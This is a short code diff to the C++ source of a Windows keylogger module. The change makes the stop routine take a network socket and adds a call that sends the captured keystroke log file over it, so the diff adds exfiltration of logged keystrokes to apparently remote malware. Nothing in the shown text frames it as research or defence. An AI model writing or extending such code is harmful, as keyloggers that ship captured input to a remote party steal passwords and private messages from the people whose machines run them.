@@ -33,13 +33,14 @@ void Keylogger_Module::run(){
     hThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
 }
 
-void Keylogger_Module::stopKeylogger(){
+void Keylogger_Module::stopKeylogger(SOCKET sock){
     shouldQuit = true;
     if(hThread){
         WaitForSingleObject(hThread, INFINITE);
         CloseHandle(hThread);
         hThread = nullptr;
     }
+    sendFileViaMsgPack(sock, fileName.c_str());
 }
 
 DWORD WINAPI KeyloggerThread(LPVOID lpParam){
